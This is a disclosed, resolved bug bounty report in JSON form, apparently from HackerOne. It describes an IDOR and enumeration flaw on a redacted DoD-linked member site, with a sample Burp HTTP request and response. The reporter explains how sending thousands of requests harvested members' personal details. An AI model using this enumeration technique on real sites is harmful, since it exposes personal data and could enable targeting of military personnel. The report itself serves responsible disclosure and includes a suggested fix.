{
  "id": 847185,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDcxODU=",
  "url": "https://hackerone.com/reports/847185",
  "title": "Members Personal Information Leak Due to IDOR",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-04-11T08:57:20.181Z",
  "submitted_at": "2020-04-11T08:57:20.181Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "r00tpgp",
    "url": "/r00tpgp",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MzA5NDcsInB1ciI6ImJsb2JfaWQifX0=--b0e2317fa7334e1c0a72aa558c4aa5c5162abfaa/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/quhVl5Bc.jpg"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-05-11T20:13:25.868Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-30T01:09:29.524Z",
  "team_member_agreed_on_going_public_at": "2021-05-11T20:13:25.701Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "##Summary\nhttps://██████ allows anyone to sign up and view other members profile.  According to wikipedia,  ███████ is part of US DoD \"████████\":\n\n██████\n\nI signed up with a regular account and noticed that by referencing users `████`, I can send thousands of \"█████████\"  and also, using another end-point, view personal information of members. \n\nFor eg. this person has all her private info displayed for any member:  https://█████/███████ her `██████████` is easily enumerated as `██████████`. \n\n\n\n███\n\n\nTherefore,  using Burp, I can run this number to reveal more members:\n\n##Request\n\nPOST /██████ HTTP/1.1\nHost: ██████████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nAuthorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82\nRest-Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82\nX-Requested-With: XMLHttpRequest\nContent-Length: 35\nOrigin: https://█████████\nConnection: close\nReferer: https://██████/██████████\nCookie: _ga=██████ ███; ██████████-Http-Session=███; googtrans=/en/en; UserName=█████ █████; ████████\n\nRequesteeId=████████&RequestMessage=+\n\n##Reply:\n\n{\n  \"████\": {\n    \"CreatedDate\": \"2020-04-11T08:22:53.247\",\n    \"██████████\": \"Pending\",\n    \"LastModifiedDate\": \"2020-04-11T08:22:53.247\",\n    \"RequestMessage\": \" \",\n    \"RequestorId\": ██████████,\n    \"RequesteeId\": █████████,\n    \"User\": {\n      \"AvatarUrl\": \"https://█████████/cfs-file/__key/system/images/anonymous.gif\",\n      \"DisplayName\": \"██████████\",\n      \"ProfileUrl\": \"https://██████████/███████\",\n      \"Username\": \"██████\",\n      \"CurrentStatus\": null,\n      \"Id\": ████████\n    },\n    \"Id\": 74509\n  },\n  \"Info\": [],\n  \"Warnings\": [],\n  \"Errors\": []\n}\n\n## Browser Response\n\n███\n\n\nNot all members provide Personal Info to anyone, therefore, I used another endpoint to craft a simple message \"█████████\", I used Burp and send thousands of \"██████\" to different `█████████` and wait for them to accept:\n\n\n##Request\n\n\n███████\n\nand I wait for those that accept my \"██████████\" and I should be able to see their Personal Info upon approval.\n\nI can confirmed that they had received my request because, using the first end-point, their `█████████` is `Pending....`__after__ I had sent the \"████\".\n\n## Impact\n\nThis technique can be used as a data harvesting method on ██████ website to retrieve members profile, I had noticed that many of the members are military personnel. Which can be of interest for terrorist or threat actors targeting US military personnel for phishing or espionage campaigns. \n\n##Fix\nThere should be some rate-limiting to the number of requests per end-point can receive from a single source ip addr or a reCAPTCHA after a few requests to stop attacker from harvesting members' profile.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 3,
  "voters": [
    "0nlymohammed",
    "ekgaribadmi",
    "meispi"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
